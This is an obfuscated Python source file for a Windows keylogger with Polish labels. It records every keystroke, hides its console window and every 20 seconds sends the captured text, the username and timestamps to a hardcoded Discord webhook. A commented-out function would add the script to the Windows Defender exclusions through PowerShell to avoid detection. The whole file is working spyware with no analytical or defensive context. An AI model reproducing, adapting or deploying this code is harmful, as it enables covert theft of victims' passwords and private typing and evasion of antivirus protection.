import os #line:1
import requests #line:2
import shutil #line:3
import tempfile #line:4
import subprocess #line:5
import win32gui #line:6
import pythoncom #line:7
import keyboard #line:8
from threading import Timer #line:9
from datetime import datetime #line:10
from discord_webhook import DiscordWebhook ,DiscordEmbed #line:11
SEND_REPORT_EVERY =20 #line:13
WEBHOOK ="https://discord.com/api/webhooks/1250891857290854581/DmaAg0zh9DJPuXyR8phoZK3wgkwQQJMpN270EFh1miMXYXLM3xHnCyelOv8Ob1tF0WRK"#line:14
class Klasa :#line:16
    def __init__ (O0O00OO00000000O0 ,OOOO000OOO0O0O0OO ,O00O0O000OOOO0OOO ="webhook"):#line:17
        O00OOOO000OOO0O0O =datetime .now ()#line:18
        O0O00OO00000000O0 .interval =OOOO000OOO0O0O0OO #line:19
        O0O00OO00000000O0 .report_method =O00O0O000OOOO0OOO #line:20
        O0O00OO00000000O0 .log =""#line:21
        O0O00OO00000000O0 .dzien =O00OOOO000OOO0O0O .strftime ('%d/%m/%Y')#line:22
        O0O00OO00000000O0 .godzina =O00OOOO000OOO0O0O .strftime ('%H:%M')#line:23
        O0O00OO00000000O0 .username =os .getlogin ()#line:24
    def callback (OO000O0OO0O000OOO ,O0OOO0O00OOO0OOOO ):#line:26
        O00O0OO0OO0O00O0O =O0OOO0O00OOO0OOOO .name #line:27
        if len (O00O0OO0OO0O00O0O )>1 :#line:28
            if O00O0OO0OO0O00O0O =="space":#line:29
                O00O0OO0OO0O00O0O =" "#line:30
            elif O00O0OO0OO0O00O0O =="enter":#line:31
                O00O0OO0OO0O00O0O ="\n"#line:32
            elif O00O0OO0OO0O00O0O =="decimal":#line:33
                O00O0OO0OO0O00O0O ="."#line:34
            else :#line:35
                O00O0OO0OO0O00O0O =O00O0OO0OO0O00O0O .replace (" ","_")#line:36
                O00O0OO0OO0O00O0O =f"\n[{O00O0OO0OO0O00O0O.upper()}] "#line:37
        OO000O0OO0O000OOO .log +=O00O0OO0OO0O00O0O #line:38
    def report_to_webhook (OOO00OO0000O000O0 ):#line:40
        O00O000OO0OOO00O0 =False #line:41
        O00O0OO0O00OO000O =DiscordWebhook (url =WEBHOOK )#line:42
        if len (OOO00OO0000O000O0 .log )>2000 :#line:43
            O00O000OO0OOO00O0 =True #line:44
            O00OOOOOO00000O0O =os .environ ["temp"]+"\\report.txt"#line:45
            with open (O00OOOOOO00000O0O ,'w+')as OO0OO000OOO0OOO00 :#line:46
                OO0OO000OOO0OOO00 .write (f"Użytkownik: {OOO00OO0000O000O0.username} \nData: {OOO00OO0000O000O0.dzien} \nGodzina: {OOO00OO0000O000O0.godzina}\n")#line:47
                OO0OO000OOO0OOO00 .write (OOO00OO0000O000O0 .log )#line:48
            with open (O00OOOOOO00000O0O ,'rb')as OOO0OO0O0O000OO00 :#line:49
                O00O0OO0O00OO000O .add_file (file =OOO0OO0O0O000OO00 .read (),filename ='report.txt')#line:50
        else :#line:51
            OOO000OOOO0OOO0O0 =DiscordEmbed (title =f"Użytkownik: {OOO00OO0000O000O0.username} \nData: {OOO00OO0000O000O0.dzien} \nGodzina: {OOO00OO0000O000O0.godzina}",description =OOO00OO0000O000O0 .log )#line:52
            O00O0OO0O00OO000O .add_embed (OOO000OOOO0OOO0O0 )#line:53
        O00O0OO0O00OO000O .execute ()#line:54
        if O00O000OO0OOO00O0 :#line:55
            os .remove (O00OOOOOO00000O0O )#line:56
    def report (O0OO0O0OOOOO00O00 ):#line:58
        if O0OO0O0OOOOO00O00 .log :#line:59
            if O0OO0O0OOOOO00O00 .report_method =="webhook":#line:60
                O0OO0O0OOOOO00O00 .report_to_webhook ()#line:61
        O0OO0O0OOOOO00O00 .log =""#line:62
        OO0OOOOOOO0000000 =Timer (interval =O0OO0O0OOOOO00O00 .interval ,function =O0OO0O0OOOOO00O00 .report )#line:63
        OO0OOOOOOO0000000 .daemon =True #line:64
        OO0OOOOOOO0000000 .start ()#line:65
    def start (O0O0OOOO00OO0O00O ):#line:67
        O0O0OOOO00OO0O00O .start_dt =datetime .now ()#line:68
        keyboard .on_release (callback =O0O0OOOO00OO0O00O .callback )#line:69
        O0O0OOOO00OO0O00O .report ()#line:70
def hide_console_window ():#line:72
    OO00000O00O00OOO0 =win32gui .GetForegroundWindow ()#line:73
    win32gui .ShowWindow (OO00000O00O00OOO0 ,0 )#line:74

#def add_to_defender_exceptions ():#line:76
 #   O0OOO0O0OO00OOO00 =os .path .abspath (__file__ )#line:77
  #  OO00000O0O00O0O00 =f"Add-MpPreference -ExclusionPath '{O0OOO0O0OO00OOO00}'"#line:78
   # try :#line:79
    #    subprocess .run (["powershell","-Command",OO00000O0O00O0O00 ],check =True )#line:80
    #except subprocess .CalledProcessError as OO000OO0OO0O00OOO :#line:81
      #  print (f"Błąd dodawania do wyjątków Windows Defender: {OO000OO0OO0O00OOO}")#line:82
if __name__ =='__main__':#line:84
   # add_to_defender_exceptions ()#line:85
    klasa =Klasa (OOOO000OOO0O0O0OO=SEND_REPORT_EVERY ,O00O0O000OOOO0OOO="webhook")#line:86
    klasa .start ()#line:87
    hide_console_window ()#line:88
    pythoncom .PumpMessages ()#line:89
